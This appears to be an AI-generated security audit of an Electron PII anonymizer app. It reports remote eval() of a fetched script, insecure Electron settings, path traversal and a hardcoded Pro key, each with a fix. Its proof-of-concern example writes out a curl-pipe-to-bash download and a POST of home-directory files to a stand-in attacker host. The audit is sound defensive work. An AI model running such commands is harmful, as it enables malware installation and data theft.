# Security Audit Report - A5 PII Anonymizer

**Audit Date:** January 2025  
**Repository:** thedotmack/A5-PII-Anonymizer  
**Auditor:** GitHub Copilot Security Analysis  
**Scope:** Comprehensive security review of application functionality and data handling

---

## Executive Summary

This security audit validates that the A5 PII Anonymizer application performs its stated function of locally anonymizing Personally Identifiable Information (PII) in documents. The application operates as described in the README, with several **CRITICAL security vulnerabilities** identified that require immediate attention.

### Overall Assessment: ⚠️ **REQUIRES IMMEDIATE ATTENTION**

**Primary Findings:**
- ✅ Application performs its core PII anonymization function as advertised
- ✅ ML model processing occurs locally (no external data transmission for anonymization)
- ✅ File processing is local-only
- ❌ **CRITICAL**: Remote code execution vulnerability via `eval()`
- ❌ **HIGH**: Insecure Electron configuration (nodeIntegration enabled, contextIsolation disabled)
- ⚠️ **MEDIUM**: Weak authentication mechanism for Pro features
- ⚠️ **LOW**: Potential for denial of service via recursive directory processing

---

## Detailed Findings

### 🔴 CRITICAL SEVERITY ISSUES

#### 1. Remote Code Execution via eval() - **SEVERITY: CRITICAL**

**Location:** `renderer.js:373-383`

```javascript
(async () => {
  try {
    const response = await fetch('https://amicus5.com/js/updates.js', { cache: 'no-cache' });
    if (!response.ok) throw new Error(`Network response not ok: ${response.statusText}`);
    const scriptText = await response.text();
    eval(scriptText);  // ⚠️ CRITICAL VULNERABILITY
    console.log('Updates script executed successfully.');
  } catch (err) {
    console.log('No updates found or offline:', err.message);
  }
})();
```

**Risk:**
- Allows arbitrary code execution from a remote server
- If `amicus5.com` is compromised or DNS is hijacked, attacker can execute ANY code with full application privileges
- Code runs with Node.js integration enabled, providing access to:
  - File system operations
  - Network operations
  - System commands
  - User data and credentials

**Impact:** 
- Complete application compromise
- Data exfiltration of user documents
- Installation of malware
- Keylogging and credential theft
- Pivot to other system resources

**Recommendation:** 
1. **IMMEDIATELY REMOVE** the `eval()` statement
2. If updates are needed, implement a secure auto-update mechanism using:
   - Electron's built-in `autoUpdater` module
   - Code signing and signature verification
   - HTTPS with certificate pinning
3. Never execute arbitrary remote code

**Proof of Concern:**
Any attacker with control over `amicus5.com/js/updates.js` or ability to perform man-in-the-middle attacks can:
```javascript
// Malicious updates.js example:
require('child_process').exec('curl attacker.com/malware.sh | bash');
require('fs').readdir(require('os').homedir(), (err, files) => {
  fetch('https://attacker.com/exfil', { method: 'POST', body: JSON.stringify(files) });
});
```

---

### 🔴 HIGH SEVERITY ISSUES

#### 2. Insecure Electron Configuration - **SEVERITY: HIGH**

**Location:** `main.js:15-23`

```javascript
webPreferences: {
  nodeIntegration: true,        // ⚠️ SECURITY RISK
  contextIsolation: false,      // ⚠️ SECURITY RISK
}
```

**Risk:**
- Renderer process has full Node.js API access
- No isolation between web content and Node.js context
- XSS vulnerabilities become Remote Code Execution vulnerabilities
- Any injected JavaScript can access file system, network, and system APIs

**Impact:**
- If ANY web content is loaded (even accidentally), it can compromise the system
- Malicious browser extensions could potentially interact with the app
- DOM-based XSS becomes system-level compromise

**Recommendation:**
```javascript
webPreferences: {
  nodeIntegration: false,          // Disable Node.js in renderer
  contextIsolation: true,          // Isolate contexts
  enableRemoteModule: false,       // Disable remote module
  sandbox: true,                   // Enable sandboxing
  preload: path.join(__dirname, 'preload.js')  // Use preload script for IPC
}
```

**Migration Path:**
1. Create a `preload.js` script to expose only necessary IPC channels
2. Remove direct Node.js usage from `renderer.js`
3. Move all file system operations to main process via IPC

---

#### 3. Path Traversal Vulnerability - **SEVERITY: HIGH**

**Location:** `main.js:74-89`

```javascript
ipcMain.handle('process-file', async (event, { filePath, outputDir }) => {
  // No validation of filePath or outputDir
  const directory = outputDir || path.dirname(filePath);
  const newFileName = FileProcessor.generateOutputFileName(fileName);
  const outputPath = path.join(directory, newFileName);
  await FileProcessor.processFile(filePath, outputPath);
});
```

**Risk:**
- No validation that `filePath` is an actual file the user selected
- No validation that `outputDir` is a legitimate directory
- Malicious renderer could request processing of system files like `/etc/passwd`
- Could write files to arbitrary locations

**Impact:**
- Read sensitive system files
- Overwrite system configuration files
- Escalate privileges

**Recommendation:**
```javascript
ipcMain.handle('process-file', async (event, { filePath, outputDir }) => {
  // Validate file exists and is readable
  if (!fs.existsSync(filePath) || !fs.statSync(filePath).isFile()) {
    throw new Error('Invalid file path');
  }
  
  // Validate output directory
  if (outputDir && (!fs.existsSync(outputDir) || !fs.statSync(outputDir).isDirectory())) {
    throw new Error('Invalid output directory');
  }
  
  // Validate file is within allowed locations
  const realPath = fs.realpathSync(filePath);
  const userHome = os.homedir();
  if (!realPath.startsWith(userHome)) {
    throw new Error('File must be in user directory');
  }
  
  // ... rest of processing
});
```

---

### 🟡 MEDIUM SEVERITY ISSUES

#### 4. Weak Authentication Mechanism - **SEVERITY: MEDIUM**

**Location:** `renderer.js:447-451`

```javascript
function validateProKey(key) {
  // e.g. "MASTERTESTKEY" or check simpleHash(userState.deviceID)
  // Return true if matches
  return (key === 'MASTERTESTKEY');
}
```

**Risk:**
- Hardcoded master key in client-side code
- Key validation occurs client-side (can be bypassed)
- No server-side verification
- Anyone reading the code can obtain Pro features

**Impact:**
- Unauthorized access to Pro features
- Revenue loss for the developer
- No actual security boundary

**Recommendation:**
Since this is client-side only and open-source, consider:
1. Remove the "Pro" feature entirely (it's not enforceable in client-side code)
2. If monetization is needed, use a server-based licensing system with:
   - Signed license tokens
   - Server-side validation
   - License tied to specific hardware/software fingerprint
3. Document that Pro features are "honor system" in open-source version

**Note:** Client-side feature flags in open-source software cannot be secured. This is expected but should be documented.

---

#### 5. Insecure Shell Execution - **SEVERITY: MEDIUM**

**Location:** `main.js:104-114`

```javascript
ipcMain.handle('open-folder', async (event, folderPath) => {
  if (folderPath) {
    if (folderPath.startsWith('http')) {
      shell.openExternal(folderPath);  // ⚠️ No URL validation
    } else {
      shell.openPath(folderPath);      // ⚠️ No path validation
    }
  }
});
```

**Risk:**
- No validation of the `folderPath` parameter
- Could open arbitrary URLs or local paths
- Potential for social engineering attacks

**Impact:**
- Open malicious websites
- Execute local files (if shell associations are exploited)

**Recommendation:**
```javascript
ipcMain.handle('open-folder', async (event, folderPath) => {
  if (!folderPath) return;
  
  if (folderPath.startsWith('http://') || folderPath.startsWith('https://')) {
    // Validate URL against whitelist
    const allowedDomains = ['amicus5.com'];
    try {
      const url = new URL(folderPath);
      if (!allowedDomains.some(domain => url.hostname === domain || url.hostname.endsWith('.' + domain))) {
        throw new Error('Domain not allowed');
      }
      shell.openExternal(folderPath);
    } catch (err) {
      console.error('Invalid URL:', err);
    }
  } else {
    // Validate path exists and is a directory
    if (fs.existsSync(folderPath) && fs.statSync(folderPath).isDirectory()) {
      shell.openPath(folderPath);
    }
  }
});
```

---

### 🟢 LOW SEVERITY ISSUES

#### 6. Recursive Directory Processing DoS - **SEVERITY: LOW**

**Location:** `renderer.js:301-321`

```javascript
function getFilesFromDirectory(dirPath) {
  let results = [];
  try {
    const list = fs.readdirSync(dirPath);
    list.forEach((file) => {
      const filePath = path.join(dirPath, file);
      const stat = fs.statSync(filePath);
      if (stat && stat.isDirectory()) {
        results = results.concat(getFilesFromDirectory(filePath));  // Unbounded recursion
      }
      // ...
    });
  } catch (err) {
    console.error(`Error reading directory ${dirPath}: ${err.message}`);
  }
  return results;
}
```

**Risk:**
- No depth limit on directory recursion
- Could cause stack overflow or hang on deep directory structures
- Could accidentally process system directories

**Impact:**
- Application hang/crash
- Excessive memory usage

**Recommendation:**
```javascript
function getFilesFromDirectory(dirPath, maxDepth = 10, currentDepth = 0) {
  if (currentDepth >= maxDepth) {
    console.warn(`Max depth reached for ${dirPath}`);
    return [];
  }
  
  let results = [];
  try {
    const list = fs.readdirSync(dirPath);
    list.forEach((file) => {
      const filePath = path.join(dirPath, file);
      const stat = fs.statSync(filePath);
      if (stat && stat.isDirectory()) {
        results = results.concat(getFilesFromDirectory(filePath, maxDepth, currentDepth + 1));
      } else {
        // ... process file
      }
    });
  } catch (err) {
    console.error(`Error reading directory ${dirPath}: ${err.message}`);
  }
  return results;
}
```

---

#### 7. Insufficient Input Validation - **SEVERITY: LOW**

**Location:** Multiple locations in `fileProcessor.js`

**Risk:**
- File extension checking only, no magic number validation
- Could process malicious files disguised with accepted extensions

**Recommendation:**
- Implement file type validation using magic numbers/signatures
- Add file size limits
- Implement timeout for processing operations

---

## Privacy Analysis

### ✅ Data Handling (POSITIVE FINDINGS)

The application correctly implements local-only PII anonymization:

1. **Local ML Model Processing**
   - Model runs locally via `@xenova/transformers`
   - `env.allowRemoteModels = false` prevents external model loading
   - No data sent to external servers for anonymization

2. **File Processing**
   - All file operations are local
   - No network transmission of document content
   - Output files written to local filesystem only

3. **PII Detection**
   - Uses context-aware ONNX model (ProtectAI's deberta_finetuned_pii)
   - Token classification approach
   - Pseudonymization with consistent mapping

### ⚠️ Data Concerns

1. **Temporary Files**
   - `renderer.js:277-299` creates temp files in system temp directory
   - Temp files may not be securely deleted
   - Could leave PII in temp directory

2. **Local Storage**
   - User state stored in `localStorage`
   - Device ID and usage tracking stored locally
   - No sensitive data, but persists across sessions

---

## Code Quality Issues

### Non-Security Code Concerns

1. **Error Handling**
   - Generic error messages could leak system information
   - Stack traces logged to console

2. **Logging**
   - Verbose console logging includes file paths and processing details
   - Could leak sensitive information in production builds

3. **Dependencies**
   - Regular dependency updates needed
   - No automated vulnerability scanning apparent

---

## Comparison to README Claims

### ✅ Validated Claims

1. **"Locally anonymizing documents"** - ✅ CONFIRMED
   - All processing is local
   - No external transmission during anonymization

2. **"Context-aware model"** - ✅ CONFIRMED
   - Uses ProtectAI's fine-tuned DeBERTa model
   - Token classification approach

3. **"ONNX-based model"** - ✅ CONFIRMED
   - Model runs via @xenova/transformers
   - Local model path configured

4. **"Cross-platform desktop UI"** - ✅ CONFIRMED
   - Electron-based application
   - Supports multiple platforms

5. **"MIT License"** - ✅ CONFIRMED
   - LICENSE file present
   - Open source as claimed

### ⚠️ Security Claims Not Addressed in README

The README does not mention:
- External network connectivity (updates.js fetching)
- Security configuration of Electron
- Data handling in temp directories

These should be documented.

---

## Nefarious Behavior Analysis

### ❌ Potentially Concerning Behaviors

1. **Remote Code Execution**
   - The `eval()` of remote JavaScript is the most concerning behavior
   - While likely intended for legitimate updates, this is a dangerous pattern
   - Could be exploited for data exfiltration or malicious purposes

2. **No Documentation of Network Calls**
   - README doesn't mention the application fetches remote scripts
   - Users expect a "local-only" application

### ✅ No Evidence of Intentional Malicious Code

- No evidence of intentional data exfiltration
- No evidence of keyloggers or credential theft
- No evidence of cryptocurrency mining
- No evidence of backdoors (beyond the eval vulnerability)

**Conclusion:** The vulnerabilities appear to be security oversights rather than intentional malicious code.

---

## Recommendations

### Immediate Actions Required (Critical Priority)

1. **REMOVE** the `eval()` statement in `renderer.js:378`
2. **UPDATE** Electron security configuration in `main.js`
3. **ADD** input validation for all IPC handlers

### Short-term Actions (High Priority)

1. Implement proper authentication for Pro features or remove them
2. Add path traversal protections
3. Implement depth limits for directory recursion
4. Add file size limits
5. Secure temp file handling

### Long-term Actions (Medium Priority)

1. Implement Content Security Policy (CSP)
2. Add automated dependency vulnerability scanning
3. Implement code signing for releases
4. Add comprehensive input validation throughout
5. Reduce logging in production builds
6. Document security architecture
7. Add security testing to CI/CD pipeline

### Documentation Updates Required

1. Update README to disclose network connectivity
2. Add SECURITY.md with responsible disclosure policy
3. Document Electron security configuration
4. Add privacy policy documenting data handling

---

## Testing Recommendations

### Security Testing Needed

1. **Penetration Testing**
   - Test the eval() vulnerability
   - Test path traversal scenarios
   - Test XSS injection vectors

2. **Fuzz Testing**
   - Test with malformed files
   - Test with extremely large files
   - Test with deeply nested directories

3. **Dependency Auditing**
   ```bash
   npm audit
   ```

4. **Static Analysis**
   - Run ESLint with security plugins
   - Use Electron-specific security linters

---

## Conclusion

The A5 PII Anonymizer **does perform its stated function** of locally anonymizing PII in documents. The core functionality is implemented as described, and the ML model processing is genuinely local without external data transmission during anonymization.

**HOWEVER**, the application contains **CRITICAL security vulnerabilities** that must be addressed immediately:

1. Remote code execution via `eval()` - represents the most severe risk
2. Insecure Electron configuration exposes users to attack
3. Missing input validation creates multiple attack vectors

### Risk Summary

- **For Users:** Using this application in its current state poses a **HIGH SECURITY RISK** due to the remote code execution vulnerability
- **For Enterprise:** Not recommended for production use without security fixes
- **For Privacy:** Core privacy claims are valid, but security issues could compromise privacy

### Overall Security Grade: **D (FAILING)**

**Recommendation:** Do not use in production environment until critical vulnerabilities are remediated.

---

## Positive Aspects

Despite the security issues, the application has several positive aspects:

1. ✅ Honest implementation of advertised features
2. ✅ Local-only PII processing (no cloud dependencies)
3. ✅ Open source and auditable
4. ✅ Uses industry-standard ML model
5. ✅ Clean separation of concerns in code structure
6. ✅ MIT license allows for security improvements

With the recommended security fixes, this could be a valuable privacy tool.

---

## Appendix: Security Checklist

- [ ] Remove eval() statement
- [ ] Enable Electron contextIsolation
- [ ] Disable nodeIntegration in renderer
- [ ] Add IPC input validation
- [ ] Implement CSP headers
- [ ] Add path traversal protections
- [ ] Implement proper authentication
- [ ] Add file size limits
- [ ] Add recursion depth limits
- [ ] Secure temp file handling
- [ ] Document network connectivity
- [ ] Add security policy
- [ ] Implement code signing
- [ ] Add automated security testing

---

**Audit Completed:** January 2025  
**Next Review Recommended:** After security fixes are implemented
